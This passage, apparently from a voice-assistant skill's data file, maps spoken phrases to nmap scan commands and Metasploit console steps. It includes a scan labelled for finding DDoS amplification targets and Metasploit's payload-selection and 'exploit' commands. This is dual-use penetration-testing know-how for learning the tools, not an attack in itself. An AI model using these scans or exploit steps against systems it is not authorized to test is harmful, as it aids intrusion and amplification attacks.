	"do a syn scan": {"speech" : "<prosody rate='95%'>n map space dash s upper-case S space 192.168.1.1</prosody>", "card" : "nmap -sS 192.168.1.1"},
	"syn": {"speech" : "<prosody rate='95%'>n map space dash s upper-case S space 192.168.1</prosody>", "card" : "nmap -sS 192.168.1.1"},
	"syn scan": {"speech" : "<prosody rate='95%'>n map space dash s upper-case S space 192.168.1.1</prosody>", "card" : "nmap -sS 192.168.1.1"},
	"scan using tcp syn": {"speech" : "<prosody rate='95%'>n map space dash s upper-case S space 192.168.1.1</prosody>", "card" : "nmap -sS 192.168.1.1"},
	// SYN will probably be often replaced by sin due to sounds-like matching
	"scan using sin": {"speech" : "<prosody rate='95%'>n map space dash s upper-case S space 192.168.1.1</prosody>", "card" : "nmap -sS 192.168.1.1"},
	"do a sin scan": {"speech" : "<prosody rate='95%'>n map space dash s upper-case S space 192.168.1.1</prosody>", "card" : "nmap -sS 192.168.1.1"},
	"sin": {"speech" : "<prosody rate='95%'>n map space dash s upper-case S space 192.168.1</prosody>", "card" : "nmap -sS 192.168.1.1"},
	"sin scan": {"speech" : "<prosody rate='95%'>n map space dash s upper-case S space 192.168.1.1</prosody>", "card" : "nmap -sS 192.168.1.1"},
	"scan using tcp sin": {"speech" : "<prosody rate='95%'>n map space dash s upper-case S space 192.168.1.1</prosody>", "card" : "nmap -sS 192.168.1.1"},
	"scan using t c p sin": {"speech" : "<prosody rate='95%'>n map space dash s upper-case S space 192.168.1.1</prosody>", "card" : "nmap -sS 192.168.1.1"},
	"using tcp sin": {"speech" : "<prosody rate='95%'>n map space dash s upper-case S space 192.168.1.1</prosody>", "card" : "nmap -sS 192.168.1.1"},
	"using t c p sin": {"speech" : "<prosody rate='95%'>n map space dash s upper-case S space 192.168.1.1</prosody>", "card" : "nmap -sS 192.168.1.1"},
	// find UDP
	"scan udp ports": {"speech" : "<prosody rate='95%'>n map space dash s upper-case U space dash p space 123 comma 1 6 1 comma 1 6 2 space 192.168.1.1</prosody>", "card" : "nmap -sU -p 123,161,162 192.168.1.1"},
	"find udp ports": {"speech" : "<prosody rate='95%'>n map space dash s upper-case U space dash p space 123 comma 1 6 1 comma 1 6 2 space 192.168.1.1</prosody>", "card" : "nmap -sU -p 123,161,162 192.168.1.1"},
	"scan for udp ports": {"speech" : "<prosody rate='95%'>n map space dash s upper-case U space dash p space 123 comma 1 6 1 comma 1 6 2 space 192.168.1.1</prosody>", "card" : "nmap -sU -p 123,161,162 192.168.1.1"},
	"scan using udp": {"speech" : "<prosody rate='95%'>n map space dash s upper-case U space dash p space 123 comma 1 6 1 comma 1 6 2 space 192.168.1.1</prosody>", "card" : "nmap -sU -p 123,161,162 192.168.1.1"},
    // sometimes speech to text hands back single letters for acronyms
	"scan u d p ports": {"speech" : "<prosody rate='95%'>n map space dash s upper-case U space dash p space 123 comma 1 6 1 comma 1 6 2 space 192.168.1.1</prosody>", "card" : "nmap -sU -p 123,161,162 192.168.1.1"},
	"find u d p ports": {"speech" : "<prosody rate='95%'>n map space dash s upper-case U space dash p space 123 comma 1 6 1 comma 1 6 2 space 192.168.1.1</prosody>", "card" : "nmap -sU -p 123,161,162 192.168.1.1"},
	"scan for u d p ports": {"speech" : "<prosody rate='95%'>n map space dash s upper-case U space dash p space 123 comma 1 6 1 comma 1 6 2 space 192.168.1.1</prosody>", "card" : "nmap -sU -p 123,161,162 192.168.1.1"},
	"scan using u d p": {"speech" : "<prosody rate='95%'>n map space dash s upper-case U space dash p space 123 comma 1 6 1 comma 1 6 2 space 192.168.1.1</prosody>", "card" : "nmap -sU -p 123,161,162 192.168.1.1"},
	"u d p ports": {"speech" : "<prosody rate='95%'>n map space dash s upper-case U space dash p space 123 comma 1 6 1 comma 1 6 2 space 192.168.1.1</prosody>", "card" : "nmap -sU -p 123,161,162 192.168.1.1"},
	"for u d p ports": {"speech" : "<prosody rate='95%'>n map space dash s upper-case U space dash p space 123 comma 1 6 1 comma 1 6 2 space 192.168.1.1</prosody>", "card" : "nmap -sU -p 123,161,162 192.168.1.1"},
	"using u d p": {"speech" : "<prosody rate='95%'>n map space dash s upper-case U space dash p space 123 comma 1 6 1 comma 1 6 2 space 192.168.1.1</prosody>", "card" : "nmap -sU -p 123,161,162 192.168.1.1"},
	// ignore discovery
	"scan ignoring discovery": {"speech" : "<prosody rate='95%'>n map space dash upper-case P n space dash upper-case F space 192.168.1.1</prosody>", "card" : "nmap -Pn -F 192.168.1.1"},
	"scan ports ignoring discovery": {"speech" : "<prosody rate='95%'>n map space dash upper-case P n space dash upper-case F space 192.168.1.1</prosody>", "card" : "nmap -Pn -F 192.168.1.1"},
	"scan while ignoring discovery": {"speech" : "<prosody rate='95%'>n map space dash upper-case P n space dash upper-case F space 192.168.1.1</prosody>", "card" : "nmap -Pn -F 192.168.1.1"},
	"scan through firewall": {"speech" : "<prosody rate='95%'>n map space dash upper-case P n space dash upper-case F space 192.168.1.1</prosody>", "card" : "nmap -Pn -F 192.168.1.1"},
	"scan without waiting for a response": {"speech" : "<prosody rate='95%'>n map space dash upper-case P n space dash upper-case F space 192.168.1.1</prosody>", "card" : "nmap -Pn -F 192.168.1.1"},
	// all ports
	"scan all ports": {"speech" : "<prosody rate='95%'>n map space dash p space dash space 192.168.1.1</prosody>", "card" : "nmap -p - 192.168.1.1"},
	"all ports": {"speech" : "<prosody rate='95%'>n map space dash p space dash space 192.168.1.1</prosody>", "card" : "nmap -p - 192.168.1.1"},
	"scan every port": {"speech" : "<prosody rate='95%'>n map space dash p space dash space 192.168.1.1</prosody>", "card" : "nmap -p - 192.168.1.1"},
	// scan top 100
	"quick scan": {"speech" : "<prosody rate='95%'>n map space dash F space 192.168.1.1</prosody>", "card" : "nmap -F 192.168.1.1"},
	"do a quick": {"speech" : "<prosody rate='95%'>n map space dash F space 192.168.1.1</prosody>", "card" : "nmap -F 192.168.1.1"},
	"do a fast scan": {"speech" : "<prosody rate='95%'>n map space dash F space 192.168.1.1</prosody>", "card" : "nmap -F 192.168.1.1"},
	"fast scan": {"speech" : "<prosody rate='95%'>n map space dash F space 192.168.1.1</prosody>", "card" : "nmap -F 192.168.1.1"},
	"scan fast": {"speech" : "<prosody rate='95%'>n map space dash F space 192.168.1.1</prosody>", "card" : "nmap -F 192.168.1.1"},
	"scan top 100 ports": {"speech" : "<prosody rate='95%'>n map space dash F space 192.168.1.1</prosody>", "card" : "nmap -F 192.168.1.1"},
	"scan top 100 most common ports": {"speech" : "<prosody rate='95%'>n map space dash F space 192.168.1.1</prosody>", "card" : "nmap -F 192.168.1.1"},
	"scan 100 common ports": {"speech" : "<prosody rate='95%'>n map space dash F space 192.168.1.1</prosody>", "card" : "nmap -F 192.168.1.1"},
	"scan common ports": {"speech" : "<prosody rate='95%'>n map space dash F space 192.168.1.1</prosody>", "card" : "nmap -F 192.168.1.1"},
	"top 100 ports": {"speech" : "<prosody rate='95%'>n map space dash F space 192.168.1.1</prosody>", "card" : "nmap -F 192.168.1.1"},
	"top 100 most common ports": {"speech" : "<prosody rate='95%'>n map space dash F space 192.168.1.1</prosody>", "card" : "nmap -F 192.168.1.1"},
	"100 common ports": {"speech" : "<prosody rate='95%'>n map space dash F space 192.168.1.1</prosody>", "card" : "nmap -F 192.168.1.1"},
	"common ports": {"speech" : "<prosody rate='95%'>n map space dash F space 192.168.1.1</prosody>", "card" : "nmap -F 192.168.1.1"},
	"scan most common ports": {"speech" : "<prosody rate='95%'>n map space dash F space 192.168.1.1</prosody>", "card" : "nmap -F 192.168.1.1"},
	"scan 100 most common ports": {"speech" : "<prosody rate='95%'>n map space dash F space 192.168.1.1</prosody>", "card" : "nmap -F 192.168.1.1"},
    // handle one-hundred spelled out
	"scan top one hundred ports": {"speech" : "<prosody rate='95%'>n map space dash F space 192.168.1.1</prosody>", "card" : "nmap -F 192.168.1.1"},
	"scan top one hundred most common ports": {"speech" : "<prosody rate='95%'>n map space dash F space 192.168.1.1</prosody>", "card" : "nmap -F 192.168.1.1"},
	"scan one hundred common ports": {"speech" : "<prosody rate='95%'>n map space dash F space 192.168.1.1</prosody>", "card" : "nmap -F 192.168.1.1"},
	"top one hundred ports": {"speech" : "<prosody rate='95%'>n map space dash F space 192.168.1.1</prosody>", "card" : "nmap -F 192.168.1.1"},
	"top one hundred most common ports": {"speech" : "<prosody rate='95%'>n map space dash F space 192.168.1.1</prosody>", "card" : "nmap -F 192.168.1.1"},
	"one hundred common ports": {"speech" : "<prosody rate='95%'>n map space dash F space 192.168.1.1</prosody>", "card" : "nmap -F 192.168.1.1"},
	"scan one hundred most common ports": {"speech" : "<prosody rate='95%'>n map space dash F space 192.168.1.1</prosody>", "card" : "nmap -F 192.168.1.1"},
	// scan a range of ports
	"scan range of ports": {"speech" : "<prosody rate='95%'>n map space dash p space 1 dash 100 space 192.168.1.1</prosody>", "card" : "nmap -p 1-100 192.168.1.1"},
	"scan a range of ports": {"speech" : "<prosody rate='95%'>n map space dash p space 1 dash 100 space 192.168.1.1</prosody>", "card" : "nmap -p 1-100 192.168.1.1"},
	"a sequence of ports": {"speech" : "<prosody rate='95%'>n map space dash p space 1 dash 100 space 192.168.1.1</prosody>", "card" : "nmap -p 1-100 192.168.1.1"},
	"range of ports": {"speech" : "<prosody rate='95%'>n map space dash p space 1 dash 100 space 192.168.1.1</prosody>", "card" : "nmap -p 1-100 192.168.1.1"},
	"a range of ports": {"speech" : "<prosody rate='95%'>n map space dash p space 1 dash 100 space 192.168.1.1</prosody>", "card" : "nmap -p 1-100 192.168.1.1"},
	// scan single port
	"scan single port": {"speech" : "<prosody rate='95%'>n map space dash p space 22 space 192.168.1.1</prosody>", "card" : "nmap -p 22 192.168.1.1"},
	"scan just one port": {"speech" : "<prosody rate='95%'>n map space dash p space 22 space 192.168.1.1</prosody>", "card" : "nmap -p 22 192.168.1.1"},	
	"scan one port": {"speech" : "<prosody rate='95%'>n map space dash p space 22 space 192.168.1.1</prosody>", "card" : "nmap -p 22 192.168.1.1"},	
	"scan a port": {"speech" : "<prosody rate='95%'>n map space dash p space 22 space 192.168.1.1</prosody>", "card" : "nmap -p 22 192.168.1.1"},
	"scan a single port": {"speech" : "<prosody rate='95%'>n map space dash p space 22 space 192.168.1.1</prosody>", "card" : "nmap -p 22 192.168.1.1"},
	"single port": {"speech" : "<prosody rate='95%'>n map space dash p space 22 space 192.168.1.1</prosody>", "card" : "nmap -p 22 192.168.1.1"},
	"just one port": {"speech" : "<prosody rate='95%'>n map space dash p space 22 space 192.168.1.1</prosody>", "card" : "nmap -p 22 192.168.1.1"},	
	"one port": {"speech" : "<prosody rate='95%'>n map space dash p space 22 space 192.168.1.1</prosody>", "card" : "nmap -p 22 192.168.1.1"},	
	"a port": {"speech" : "<prosody rate='95%'>n map space dash p space 22 space 192.168.1.1</prosody>", "card" : "nmap -p 22 192.168.1.1"},
	"a single port": {"speech" : "<prosody rate='95%'>n map space dash p space 22 space 192.168.1.1</prosody>", "card" : "nmap -p 22 192.168.1.1"},
	// scan 1 ip
	"scan just one ip address": {"speech" : "<prosody rate='95%'>n map space 192.168.1.1</prosody>", "card" : "nmap 192.168.1.1"},	
	"scan just one ip": {"speech" : "<prosody rate='95%'>n map space 192.168.1.1</prosody>", "card" : "nmap 192.168.1.1"},	
	"scan one ip": {"speech" : "<prosody rate='95%'>n map space 192.168.1.1</prosody>", "card" : "nmap 192.168.1.1"},	
	"scan an ip address": {"speech" : "<prosody rate='95%'>n map space 192.168.1.1</prosody>", "card" : "nmap 192.168.1.1"},	
	"scan an ip": {"speech" : "<prosody rate='95%'>n map space 192.168.1.1</prosody>", "card" : "nmap 192.168.1.1"},	
	"scan a single ip": {"speech" : "<prosody rate='95%'>n map space 192.168.1.1</prosody>", "card" : "nmap 192.168.1.1"},
	"scan just a single ip": {"speech" : "<prosody rate='95%'>n map space 192.168.1.1</prosody>", "card" : "nmap 192.168.1.1"},
	"just one ip address": {"speech" : "<prosody rate='95%'>n map space 192.168.1.1</prosody>", "card" : "nmap 192.168.1.1"},	
	"just one ip": {"speech" : "<prosody rate='95%'>n map space 192.168.1.1</prosody>", "card" : "nmap 192.168.1.1"},	
	"one ip": {"speech" : "<prosody rate='95%'>n map space 192.168.1.1</prosody>", "card" : "nmap 192.168.1.1"},	
	"an ip address": {"speech" : "<prosody rate='95%'>n map space 192.168.1.1</prosody>", "card" : "nmap 192.168.1.1"},	
	"an ip": {"speech" : "<prosody rate='95%'>n map space 192.168.1.1</prosody>", "card" : "nmap 192.168.1.1"},	
	"a single ip": {"speech" : "<prosody rate='95%'>n map space 192.168.1.1</prosody>", "card" : "nmap 192.168.1.1"},
	"just a single ip": {"speech" : "<prosody rate='95%'>n map space 192.168.1.1</prosody>", "card" : "nmap 192.168.1.1"},
	// fqdn	
	"scan a host": {"speech" : "<prosody rate='100%'>n map space then the fully qualified domain name you want to scan.</prosody>", "card" : "nmap www.yourhosttoscan.com"},
	"scan a domain name": {"speech" : "<prosody rate='100%'>n map space then the fully qualified domain name you want to scan.</prosody>", "card" : "nmap www.yourhosttoscan.com"},
	"scan a fqdn": {"speech" : "<prosody rate='100%'>n map space then the fully qualified domain name you want to scan.</prosody>", "card" : "nmap www.yourhosttoscan.com"},
	"a host": {"speech" : "<prosody rate='100%'>n map space then the fully qualified domain name you want to scan.</prosody>", "card" : "nmap www.yourhosttoscan.com"},
	"a domain name": {"speech" : "<prosody rate='100%'>n map space then the fully qualified domain name you want to scan.</prosody>", "card" : "nmap www.yourhosttoscan.com"},
	"a fqdn": {"speech" : "<prosody rate='100%'>n map space then the fully qualified domain name you want to scan.</prosody>", "card" : "nmap www.yourhosttoscan.com"},
	// scan ip range
	"scan a sequence of ip addresses": {"speech" : "To scan 20 IP addresses, at the command prompt enter <prosody rate='95%'>n map space 192.168.1.1 dash 20</prosody>", "card" : "nmap 192.168.1.1-20"},
	"scan a sequence of ips": {"speech" : "To scan 20 IP addresses, at the command prompt enter <prosody rate='95%'>n map space 192.168.1.1 dash 20</prosody>", "card" : "nmap 192.168.1.1-20"},
	"scan a range of ips": {"speech" : "To scan 20 IP addresses, at the command prompt enter <prosody rate='95%'>n map space 192.168.1.1 dash 20</prosody>", "card" : "nmap 192.168.1.1-20"},
	"scan a range of i p s": {"speech" : "To scan 20 IP addresses, at the command prompt enter <prosody rate='95%'>n map space 192.168.1.1 dash 20</prosody>", "card" : "nmap 192.168.1.1-20"},
	"a sequence of ip addresses": {"speech" : "To scan 20 IP addresses, at the command prompt enter <prosody rate='95%'>n map space 192.168.1.1 dash 20</prosody>", "card" : "nmap 192.168.1.1-20"},
	"a sequence of ips": {"speech" : "To scan 20 IP addresses, at the command prompt enter <prosody rate='95%'>n map space 192.168.1.1 dash 20</prosody>", "card" : "nmap 192.168.1.1-20"},
	"a range of ips": {"speech" : "To scan 20 IP addresses, at the command prompt enter <prosody rate='95%'>n map space 192.168.1.1 dash 20</prosody>", "card" : "nmap 192.168.1.1-20"},
	"a sequence of i p s": {"speech" : "To scan 20 IP addresses, at the command prompt enter <prosody rate='95%'>n map space 192.168.1.1 dash 20</prosody>", "card" : "nmap 192.168.1.1-20"},
	"a range of i p s": {"speech" : "To scan 20 IP addresses, at the command prompt enter <prosody rate='95%'>n map space 192.168.1.1 dash 20</prosody>", "card" : "nmap 192.168.1.1-20"},
	"a range of ip addresses": {"speech" : "To scan 20 IP addresses, at the command prompt enter <prosody rate='95%'>n map space 192.168.1.1 dash 20</prosody>", "card" : "nmap 192.168.1.1-20"},
	// subnet scan
	"scan a network segment": {"speech" : "<prosody rate='95%'>n map space 192.168.1.0 forward slash 24</prosody>", "card" : "nmap 192.168.1.0/24"},
	"scan a network": {"speech" : "<prosody rate='95%'>n map space 192.168.1.0 forward slash 24</prosody>", "card" : "nmap 192.168.1.0/24"},
	"a network": {"speech" : "<prosody rate='95%'>n map space 192.168.1.0 forward slash 24</prosody>", "card" : "nmap 192.168.1.0/24"},
	"a network segment": {"speech" : "<prosody rate='95%'>n map space 192.168.1.0 forward slash 24</prosody>", "card" : "nmap 192.168.1.0/24"},
	"a subnet": {"speech" : "<prosody rate='95%'>n map space 192.168.1.0 forward slash 24</prosody>", "card" : "nmap 192.168.1.0/24"},
	"do a subnet scan": {"speech" : "<prosody rate='95%'>n map space 192.168.1.0 forward slash 24</prosody>", "card" : "nmap 192.168.1.0/24"},
	// targets from a file
	"scan targets from a file": {"speech" : "<prosody rate='95%'>n map space dash i upper-case L space your file dot T X T</prosody>", "card" : "nmap -iL your-file-of-ips.txt"},
	"load scan targets from a file": {"speech" : "<prosody rate='95%'>n map space dash i upper-case L space your file dot T X T</prosody>", "card" : "nmap -iL your-file-of-ips.txt"},
	"scan ip addresses from a file":  {"speech" : "<prosody rate='95%'>n map space dash i upper-case L space your file dot T X T</prosody>", "card" : "nmap -iL your-file-of-ips.txt"},
	"ip addresses from a file":  {"speech" : "<prosody rate='95%'>n map space dash i upper-case L space your file dot T X T</prosody>", "card" : "nmap -iL your-file-of-ips.txt"},
	// ddos
	"scan for ddos targets": {"speech" : "The syntax for this command is complex, please see the output of the Alexa app for the syntax.", "card" : "nmap –sU –A –PN –n –pU:19,53,123,161 –script=ntp-monlist,dns-recursion,snmp-sysdescr 192.168.1.0/24"},
	"do a ddos scan": {"speech" : "The syntax for this command is complex, please see the output of the Alexa app for the syntax.", "card" : "nmap –sU –A –PN –n –pU:19,53,123,161 –script=ntp-monlist,dns-recursion,snmp-sysdescr 192.168.1.0/24"},
	"look for ddos": {"speech" : "The syntax for this command is complex, please see the output of the Alexa app for the syntax.", "card" : "nmap –sU –A –PN –n –pU:19,53,123,161 –script=ntp-monlist,dns-recursion,snmp-sysdescr 192.168.1.0/24"},
	"look for ddos targets": {"speech" : "The syntax for this command is complex, please see the output of the Alexa app for the syntax.", "card" : "nmap –sU –A –PN –n –pU:19,53,123,161 –script=ntp-monlist,dns-recursion,snmp-sysdescr 192.168.1.0/24"},
	"scan for ddos": {"speech" : "The syntax for this command is complex, please see the output of the Alexa app for the syntax.", "card" : "nmap –sU –A –PN –n –pU:19,53,123,161 –script=ntp-monlist,dns-recursion,snmp-sysdescr 192.168.1.0/24"},
	"scan ddos targets": {"speech" : "The syntax for this command is complex, please see the output of the Alexa app for the syntax.", "card" : "nmap –sU –A –PN –n –pU:19,53,123,161 –script=ntp-monlist,dns-recursion,snmp-sysdescr 192.168.1.0/24"},
	"scan ddos vulnerable systems": {"speech" : "The syntax for this command is complex, please see the output of the Alexa app for the syntax.", "card" : "nmap –sU –A –PN –n –pU:19,53,123,161 –script=ntp-monlist,dns-recursion,snmp-sysdescr 192.168.1.0/24"},
	"for ddos": {"speech" : "The syntax for this command is complex, please see the output of the Alexa app for the syntax.", "card" : "nmap –sU –A –PN –n –pU:19,53,123,161 –script=ntp-monlist,dns-recursion,snmp-sysdescr 192.168.1.0/24"},
	"ddos targets": {"speech" : "The syntax for this command is complex, please see the output of the Alexa app for the syntax.", "card" : "nmap –sU –A –PN –n –pU:19,53,123,161 –script=ntp-monlist,dns-recursion,snmp-sysdescr 192.168.1.0/24"},
	"ddos vulnerable systems": {"speech" : "The syntax for this command is complex, please see the output of the Alexa app for the syntax.", "card" : "nmap –sU –A –PN –n –pU:19,53,123,161 –script=ntp-monlist,dns-recursion,snmp-sysdescr 192.168.1.0/24"},
    // handle the various ways the speech can be translated
	"scan for d dos targets": {"speech" : "The syntax for this command is complex, please see the output of the Alexa app for the syntax.", "card" : "nmap –sU –A –PN –n –pU:19,53,123,161 –script=ntp-monlist,dns-recursion,snmp-sysdescr 192.168.1.0/24"},
	"do a d dos scan": {"speech" : "The syntax for this command is complex, please see the output of the Alexa app for the syntax.", "card" : "nmap –sU –A –PN –n –pU:19,53,123,161 –script=ntp-monlist,dns-recursion,snmp-sysdescr 192.168.1.0/24"},
	"look for d dos": {"speech" : "The syntax for this command is complex, please see the output of the Alexa app for the syntax.", "card" : "nmap –sU –A –PN –n –pU:19,53,123,161 –script=ntp-monlist,dns-recursion,snmp-sysdescr 192.168.1.0/24"},
	"look for d dos targets": {"speech" : "The syntax for this command is complex, please see the output of the Alexa app for the syntax.", "card" : "nmap –sU –A –PN –n –pU:19,53,123,161 –script=ntp-monlist,dns-recursion,snmp-sysdescr 192.168.1.0/24"},
	"scan for d dos": {"speech" : "The syntax for this command is complex, please see the output of the Alexa app for the syntax.", "card" : "nmap –sU –A –PN –n –pU:19,53,123,161 –script=ntp-monlist,dns-recursion,snmp-sysdescr 192.168.1.0/24"},
	"scan d dos targets": {"speech" : "The syntax for this command is complex, please see the output of the Alexa app for the syntax.", "card" : "nmap –sU –A –PN –n –pU:19,53,123,161 –script=ntp-monlist,dns-recursion,snmp-sysdescr 192.168.1.0/24"},
	"scan d dos vulnerable systems": {"speech" : "The syntax for this command is complex, please see the output of the Alexa app for the syntax.", "card" : "nmap –sU –A –PN –n –pU:19,53,123,161 –script=ntp-monlist,dns-recursion,snmp-sysdescr 192.168.1.0/24"},
	"for d dos": {"speech" : "The syntax for this command is complex, please see the output of the Alexa app for the syntax.", "card" : "nmap –sU –A –PN –n –pU:19,53,123,161 –script=ntp-monlist,dns-recursion,snmp-sysdescr 192.168.1.0/24"},
	"d dos targets": {"speech" : "The syntax for this command is complex, please see the output of the Alexa app for the syntax.", "card" : "nmap –sU –A –PN –n –pU:19,53,123,161 –script=ntp-monlist,dns-recursion,snmp-sysdescr 192.168.1.0/24"},
	"d dos vulnerable systems": {"speech" : "The syntax for this command is complex, please see the output of the Alexa app for the syntax.", "card" : "nmap –sU –A –PN –n –pU:19,53,123,161 –script=ntp-monlist,dns-recursion,snmp-sysdescr 192.168.1.0/24"},
	"for d dos targets": {"speech" : "The syntax for this command is complex, please see the output of the Alexa app for the syntax.", "card" : "nmap –sU –A –PN –n –pU:19,53,123,161 –script=ntp-monlist,dns-recursion,snmp-sysdescr 192.168.1.0/24"},
    // handle the spelled out version of DDOS
	"scan for d. d. o. s. targets": {"speech" : "The syntax for this command is complex, please see the output of the Alexa app for the syntax.", "card" : "nmap –sU –A –PN –n –pU:19,53,123,161 –script=ntp-monlist,dns-recursion,snmp-sysdescr 192.168.1.0/24"},
	"do a d. d. o. s. scan": {"speech" : "The syntax for this command is complex, please see the output of the Alexa app for the syntax.", "card" : "nmap –sU –A –PN –n –pU:19,53,123,161 –script=ntp-monlist,dns-recursion,snmp-sysdescr 192.168.1.0/24"},
	"look for d. d. o. s.": {"speech" : "The syntax for this command is complex, please see the output of the Alexa app for the syntax.", "card" : "nmap –sU –A –PN –n –pU:19,53,123,161 –script=ntp-monlist,dns-recursion,snmp-sysdescr 192.168.1.0/24"},
	"look for d. d. o. s. targets": {"speech" : "The syntax for this command is complex, please see the output of the Alexa app for the syntax.", "card" : "nmap –sU –A –PN –n –pU:19,53,123,161 –script=ntp-monlist,dns-recursion,snmp-sysdescr 192.168.1.0/24"},
	"scan for d. d. o. s.": {"speech" : "The syntax for this command is complex, please see the output of the Alexa app for the syntax.", "card" : "nmap –sU –A –PN –n –pU:19,53,123,161 –script=ntp-monlist,dns-recursion,snmp-sysdescr 192.168.1.0/24"},
	"scan d. d. o. s. targets": {"speech" : "The syntax for this command is complex, please see the output of the Alexa app for the syntax.", "card" : "nmap –sU –A –PN –n –pU:19,53,123,161 –script=ntp-monlist,dns-recursion,snmp-sysdescr 192.168.1.0/24"},
	"scan d. d. o. s. vulnerable systems": {"speech" : "The syntax for this command is complex, please see the output of the Alexa app for the syntax.", "card" : "nmap –sU –A –PN –n –pU:19,53,123,161 –script=ntp-monlist,dns-recursion,snmp-sysdescr 192.168.1.0/24"}
    
} };

const metasploit = { "METASPLOIT_EN_US": {
	"get help": {"speech": "At the MSF console prompt enter,question mark or the word,help.", "card" : "msf> ?"},
	"quit": {"speech" : "At the MSF console prompt type, exit or, quit. If you enter the word,shutdown or,reboot the system itself will restart.", "card" : "msf> exit" },
	"exit": {"speech" : "At the MSF console prompt type, exit or, quit. If you enter the word,shutdown or,reboot the system itself will restart.", "card" : "msf> quit"},
	"search exploit": {"speech" : "At the MSF console prompt enter, search, followed by a regular expression or partial exploit name.","card" : "Example of a metasploit search: msf> search Apache or msf> search Windows 7"},
	"search exploits": {"speech" : "At the MSF console prompt enter, search, followed by a regular expression or partial exploit name.","card" : "Example of a metasploit search: msf> search Apache or msf> search Windows 7"},
	"tell what exploits are available": {"speech" : "At the MSF console prompt enter, search, followed by a regular expression or partial exploit name.","card" : "Example of a metasploit search: msf> search Apache or msf> search Windows 7"},
	"find exploit": {"speech" : "At the MSF console prompt enter, search, followed by a regular expression or partial exploit name.","card" : "Example of a metasploit search: msf> search Apache or msf> search Windows 7"},
	"find exploits": {"speech" : "At the MSF console prompt enter, search followed by a regular expression or partial exploit name.","card" : "Example of a metasploit search: msf> search Apache or msf> search Windows 7"},
	"find what exploits are available": {"speech" : "At the MSF console prompt enter, search followed by a regular expression or partial exploit name.","card" : "Example of a metasploit search: msf> search Apache or msf> search Windows 7"},
	"search for an exploit": {"speech" : "At the MSF console prompt enter, search followed by a regular expression or partial exploit name.","card" : "Example of a metasploit search: msf> search Apache or msf> search Windows 7"},
	"find an exploit": {"speech" : "At the MSF console prompt enter, search followed by a regular expression or partial exploit name.","card" : "Example of a metasploit search: msf> search Apache or msf> search Windows 7"},
	"select an exploit": {"speech" : "At the MSF console prompt enter, search followed by a regular expression or partial exploit name.","card" : "Example of a metasploit search: msf> search Apache or msf> search Windows 7"},
	"select the exploit": {"speech" : "At the MSF console prompt enter, search followed by a regular expression or partial exploit name.","card" : "Example of a metasploit search: msf> search Apache or msf> search Windows 7"},
	"specify exploit": {"speech" : "At the MSF console prompt enter, use payload followed by the path to the payload.","card" : "msf> use payload \\path\\to\\payload"},
	"specify an exploit": {"speech" : "At the MSF console prompt enter, use payload followed by the path to the payload.","card" : "msf> use payload \\path\\to\\payload"},
	"specify the exploit": {"speech" : "At the MSF console prompt enter, use payload followed by the path to the payload.","card" : "msf> use payload \\path\\to\\payload"},
	"specify payload": {"speech" : "At the MSF console prompt enter, use payload followed by the path to the payload.", "card" : "msf> use payload \\path\\to\\payload"},
	"specify a payload": {"speech" : "At the MSF console prompt enter, use payload followed by the path to the payload.", "card" : "msf> use payload \\path\\to\\payload"},
	"specify the payload": {"speech" : "At the MSF console prompt enter, use payload followed by the path to the payload.", "card" : "msf> use payload \\path\\to\\payload"},
	"set a payload": {"speech" : "At the MSF console prompt enter, use payload followed by the path to the payload.", "card" : "msf> use payload \\path\\to\\payload"},
	"set the payload": {"speech" : "At the MSF console prompt enter, use payload followed by the path to the payload.", "card" : "msf> use payload \\path\\to\\payload"},
	"pick a payload": {"speech" : "At the MSF console prompt enter, use payload followed by the path to the payload.", "card" : "msf> use payload \\path\\to\\payload"},
	"pick the payload": {"speech" : "At the MSF console prompt enter, use payload followed by the path to the payload.", "card" : "msf> use payload \\path\\to\\payload"},
	"select a payload": {"speech" : "At the MSF console prompt enter, use payload followed by the path to the payload.", "card" : "msf> use payload \\path\\to\\payload"},
	"select the payload": {"speech" : "At the MSF console prompt enter, use payload followed by the path to the payload.", "card" : "msf> use payload \\path\\to\\payload"},
	"view module options": {"speech" : "At the MSF console prompt enter, show options.","card" : "Example of show module options: msf> show options"},
	"view a modules options": {"speech" : "At the MSF console prompt enter, show options.","card" : "Example of show module options: msf> show options"},
	"see what options a module has": {"speech" : "At the MSF console prompt enter, show options.","card" : "Example of show module options: msf> show options"},
	"view what options a module has": {"speech" : "At the MSF console prompt enter, show options.","card" : "Example of show module options: msf> show options"},
	"show module options": {"speech" : "At the MSF console prompt enter, show options.","card" : "Example of show module options: msf> show options"},
	"show a modules options": {"speech" : "At the MSF console prompt enter, show options.","card" : "Example of show module options: msf> show options"},
	"get module options": {"speech" : "At the MSF console prompt enter, show options.","card" : "Example of show module options: msf> show options"},
	"get a modules options": {"speech" : "At the MSF console prompt enter, show options.","card" : "Example of show module options: msf> show options"},
	"find out what options a module has": {"speech" : "At the MSF console prompt enter, show options.","card" : "Example of show module options: msf> show options"},
	"display the modules options": {"speech" : "At the MSF console prompt enter, show options.","card" : "Example of show module options: msf> show options"},
	"display module options": {"speech" : "At the MSF console prompt enter, show options.","card" : "Example of show module options: msf> show options"},
	"display a modules options": {"speech" : "At the MSF console prompt enter, show options.","card" : "Example of show module options: msf> show options"},
	"module options": {"speech" : "At the MSF console prompt enter, show options.","card" : "Example of show module options: msf> show options"},
	"find module options": {"speech" : "At the MSF console prompt enter, show options.","card" : "Example of show module options: msf> show options"},
	"find options": {"speech" : "At the MSF console prompt enter, show options.","card" : "Example of show module options: msf> show options"},
	"determine what options are available": {"speech" : "At the MSF console prompt enter, show options.","card" : "Example of show module options: msf> show options"},
	"start exploiting": {"speech" : "At the MSF console prompt enter, exploit.","card" : "Example of show module options: msf> exploit"},
	"begin exploiting": {"speech" : "At the MSF console prompt enter, exploit.","card" : "Example of show module options: msf> exploit"},
	"start the exploit": {"speech" : "At the MSF console prompt enter, exploit.","card" : "Example of show module options: msf> exploit"},
	"start the hack": {"speech" : "At the MSF console prompt enter, exploit.","card" : "Example of show module options: msf> exploit"},
	"begin the exploit": {"speech" : "At the MSF console prompt enter, exploit.","card" : "Example of show module options: msf> exploit"},
	"initiate the exploit": {"speech" : "At the MSF console prompt enter, exploit.","card" : "Example of show module options: msf> exploit"},
	"initiate an exploit": {"speech" : "At the MSF console prompt enter, exploit.","card" : "Example of show module options: msf> exploit"},
	"begin an exploit": {"speech" : "At the MSF console prompt enter, exploit.","card" : "Example of show module options: msf> exploit"},
	"start an exploit": {"speech" : "At the MSF console prompt enter, exploit.","card" : "Example of show module options: msf> exploit"},
